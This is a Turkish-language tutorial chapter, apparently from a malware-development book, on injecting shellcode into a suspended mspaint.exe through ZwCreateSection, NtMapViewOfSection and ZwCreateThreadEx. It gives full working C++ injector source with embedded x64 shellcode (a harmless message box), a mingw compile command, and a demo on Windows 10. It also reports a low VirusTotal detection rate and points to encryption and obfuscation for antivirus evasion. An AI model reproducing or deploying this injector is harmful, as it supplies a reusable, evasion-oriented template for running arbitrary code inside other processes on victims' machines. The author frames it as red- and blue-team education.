\newpage
\subsection{25. ZwCreateSection ile kod enjeksiyonu. Basit C++ zararlı yazılım örneği.}

﷽

![injection](./images/35/2022-01-16_22-54.png){width="80%"}    

Bir önceki bölümde, bellek bölümleri üzerinden kod enjeksiyonundan bahsetmiştim.      

Bu bölüm, bazı `Nt` öneklerini `Zw` önekleriyle değiştirme üzerine yaptığım kendi araştırmaların bir sonucudur.

### Zw öneki nedir?    

`Nt` öneki, Windows NT'nin bir kısaltmasıdır, ancak `Zw` önekinin herhangi bir anlamı yoktur.

[MSDN](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-nt-and-zw-versions-of-the-native-system-services-routines)'ye göre:

> Bir kullanıcı modu uygulaması, yerel bir sistem hizmet rutinine ait Nt  veya Zw sürümünü çağırdığında, rutin her zaman aldığı parametreleri güvenilir olmayan bir kullanıcı modu kaynağından gelen değerler olarak değerlendirir. Rutin, parametre değerlerini kullanmadan önce bu değerleri dikkatlice doğrular. Özellikle, rutin, arayanın sağladığı tamponları kontrol eder ve tamponların geçerli bir kullanıcı modu belleğinde yer aldığından ve düzgün bir şekilde hizalandığından emin olur. (When a user-mode application calls the Nt or Zw version of a native system services routine, the routine always treats the parameters that it receives as values that come from a user-mode source that is not trusted. The routine thoroughly validates the parameter values before it uses the parameters. In particular, the routine probes any caller-supplied buffers to verify that the buffers are located in valid user-mode memory and are aligned properly.)    

### pratik örnek. C++ zararlı yazılım.    

Hadi, önceki gönderi örneğindeki bazı NT API işlevlerini `Zw` önekli işlevlerle değiştirelim.     

İlk yapılması gereken şey, `CreateProcessA` ile geçerli bir süreç oluşturmaktır:     

```cpp
BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
```

![injection 2](./images/35/2022-01-16_23-33.png){width="80%"}    

Sonraki adımlar [önceki](https://cocomelonc.github.io/tutorial/2021/12/13/malware-injection-12.html) gönderiye benzer, ancak tek
fark, `ZwCreateThreadEx` kullanmamızdır:      

```cpp
typedef NTSTATUS(NTAPI* pZwCreateThreadEx)(
  _Out_ PHANDLE                 ThreadHandle,
  _In_ ACCESS_MASK              DesiredAccess,
  _In_opt_ POBJECT_ATTRIBUTES   ObjectAttributes,
  _In_ HANDLE                   ProcessHandle,
  _In_ PVOID                    StartRoutine,
  _In_opt_ PVOID                Argument,
  _In_ ULONG                    CreateFlags,
  _In_opt_ ULONG_PTR            ZeroBits,
  _In_opt_ SIZE_T               StackSize,
  _In_opt_ SIZE_T               MaximumStackSize,
  _In_opt_ PVOID                AttributeList
);
```

![injection 3](./images/35/2022-01-16_23-40.png){width="80%"}    

payload'u tetiklemek için `RtlCreateUserThread` yerine `ZwCreateThreadEx` kullandık.    

Ve bir diğer fark, tutamakları kapatmak (temizleme) için `ZwClose` kullandık:    

```cpp
typedef NTSTATUS(NTAPI* pZwClose)(
  _In_ HANDLE       Handle
);
```
![injection 4](./images/35/2022-01-16_23-47.png){width="80%"}    

Yani, örnek zararlı yazılımımızın tam kaynak kodu şu şekilde:     

```cpp
/*
 * hack.cpp - code injection via 
 * ZwCreateSection, ZwUnmapViewOfSection
 * @cocomelonc
 * https://cocomelonc.github.io/tutorial/
 2022/01/14/malware-injection-13.html
*/
#include <cstdio>
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll")

// ZwCreateSection
typedef NTSTATUS(NTAPI* pZwCreateSection)(
  OUT PHANDLE            SectionHandle,
  IN ULONG               DesiredAccess,
  IN POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,
  IN PLARGE_INTEGER      MaximumSize OPTIONAL,
  IN ULONG               PageAttributess,
  IN ULONG               SectionAttributes,
  IN HANDLE              FileHandle OPTIONAL
);

// NtMapViewOfSection syntax
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
  HANDLE            SectionHandle,
  HANDLE            ProcessHandle,
  PVOID*            BaseAddress,
  ULONG_PTR         ZeroBits,
  SIZE_T            CommitSize,
  PLARGE_INTEGER    SectionOffset,
  PSIZE_T           ViewSize,
  DWORD             InheritDisposition,
  ULONG             AllocationType,
  ULONG             Win32Protect
);

// ZwCreateThreadEx
typedef NTSTATUS(NTAPI* pZwCreateThreadEx)(
  _Out_ PHANDLE                 ThreadHandle,
  _In_ ACCESS_MASK              DesiredAccess,
  _In_opt_ POBJECT_ATTRIBUTES   ObjectAttributes,
  _In_ HANDLE                   ProcessHandle,
  _In_ PVOID                    StartRoutine,
  _In_opt_ PVOID                Argument,
  _In_ ULONG                    CreateFlags,
  _In_opt_ ULONG_PTR            ZeroBits,
  _In_opt_ SIZE_T               StackSize,
  _In_opt_ SIZE_T               MaximumStackSize,
  _In_opt_ PVOID                AttributeList
);

// ZwUnmapViewOfSection syntax
typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
  HANDLE            ProcessHandle,
  PVOID             BaseAddress
);

// ZwClose
typedef NTSTATUS(NTAPI* pZwClose)(
  _In_ HANDLE       Handle
);

unsigned char my_payload[] =

  // 64-bit meow-meow messagebox
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

int main(int argc, char* argv[]) {
  HANDLE sh; // section handle
  HANDLE th; // thread handle
  STARTUPINFOA si = {};
  PROCESS_INFORMATION pi = {};
  PROCESS_BASIC_INFORMATION pbi = {};
  OBJECT_ATTRIBUTES oa;
  SIZE_T s = 4096;
  LARGE_INTEGER sectionS = { s };
  PVOID rb = NULL; // remote buffer
  PVOID lb = NULL; // local buffer

  ZeroMemory(&si, sizeof(STARTUPINFO));
  ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
  ZeroMemory(&pbi, sizeof(PROCESS_BASIC_INFORMATION));
  si.cb = sizeof(STARTUPINFO);

  ZeroMemory(&oa, sizeof(OBJECT_ATTRIBUTES));

  HMODULE ntdll = GetModuleHandleA("ntdll");
  pZwCreateSection myZwCreateSection = 
  (pZwCreateSection)(GetProcAddress(
    ntdll, "ZwCreateSection"));
  pNtMapViewOfSection myNtMapViewOfSection = 
  (pNtMapViewOfSection)(GetProcAddress(
    ntdll, "NtMapViewOfSection"));
  pZwUnmapViewOfSection myZwUnmapViewOfSection = 
  (pZwUnmapViewOfSection)(GetProcAddress(
    ntdll, "ZwUnmapViewOfSection"));
  pZwCreateThreadEx myZwCreateThreadEx = 
  (pZwCreateThreadEx)GetProcAddress(
    ntdll, "ZwCreateThreadEx");
  pZwClose myZwClose = 
  (pZwClose)GetProcAddress(
    ntdll, "ZwClose");

  // create process as suspended
  if (!CreateProcessA(NULL, 
  (LPSTR) "C:\\windows\\system32\\mspaint.exe", 
  NULL, NULL, NULL,
  CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, 
  NULL, NULL, &si, &pi)) {
    printf("create process failed :(\n");
    return -2;
  };

  myZwCreateSection(&sh, 
  SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, 
  NULL, &sectionS, PAGE_EXECUTE_READWRITE, 
  SEC_COMMIT, NULL);
  printf("section handle: %p.\n", sh);

  // mapping the section into current process
  myNtMapViewOfSection(sh, GetCurrentProcess(), &lb, 
  NULL, NULL, NULL,
  &s, 2, NULL, PAGE_EXECUTE_READWRITE);
  printf("local process mapped at address: %p.\n", lb);

  // mapping the section into remote process
  myNtMapViewOfSection(sh, pi.hProcess, &rb, 
  NULL, NULL, NULL,
  &s, 2, NULL, PAGE_EXECUTE_READWRITE);
  printf("remote process mapped at address: %p\n", rb);

  // copy payload
  memcpy(lb, my_payload, sizeof(my_payload));

  // unmapping section from current process
  myZwUnmapViewOfSection(GetCurrentProcess(), lb);
  printf("mapped at address: %p.\n", lb);
  myZwClose(sh);

  sh = NULL;

  // create new thread
  myZwCreateThreadEx(&th, 0x1FFFFF, NULL, pi.hProcess,
  rb, NULL, CREATE_SUSPENDED, 0, 0, 0, 0);
  printf("thread: %p.\n", th);
  ResumeThread(pi.hThread);
  myZwClose(pi.hThread);
  myZwClose(th);

  return 0;
}
```

### demo

Zararlı yazılımımızı derleyelim:     

```bash
x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive
```

![injection 5](./images/35/2022-01-16_23-57.png){width="80%"}    

Şimdi her şeyi eylemde görelim! Bizim durumumuzda, kurban makine `Windows 10 x64`:     

![injection 6](./images/35/2022-01-17_00-04.png){width="80%"}    

![injection 7](./images/35/2022-01-17_00-08.png){width="80%"}    


Her şeyin mükemmel bir şekilde tamamlandığını görebiliyoruz :)    

Şimdi, zararlı yazılımımızı VirusTotal'a yükleyelim:    

![injection 8](./images/35/2022-01-17_00-11.png){width="80%"}    

[https://www.virustotal.com/gui/file/cca1a55dd587cb3e6b4768e6d4febe2966741063e6beac5951f119bf2ba193ae/detection](https://www.virustotal.com/gui/file/cca1a55dd587cb3e6b4768e6d4febe2966741063e6beac5951f119bf2ba193ae/detection)    

**Sonuç olarak, 67 antivirüs motorundan 5 tanesi dosyamızı zararlı olarak algıladı.**    

`Moneta64.exe` sonucu:     

![injection 9](./images/35/2022-01-17_16-03.png){width="80%"}    

Daha iyi sonuçlar için, istersek payload'u bir anahtarla [şifreleyebilir](https://cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html), işlevleri [gizleyebilir](https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html) ya da bu iki tekniği birleştirebiliriz.     

Umarım bu yazı, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.     

[CreateProcessA](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa?redirectedfrom=MSDN)     
[ZwCreateSection](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection)    
[NtMapViewOfSection](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html)    
[ZwUnmapViewOfSection](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection)    
[ZwClose](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwclose)    
[Moneta64.exe](https://github.com/forrest-orr/moneta)    
[Github'taki kaynak kod](https://github.com/cocomelonc/2022-01-14-malware-injection-13)    
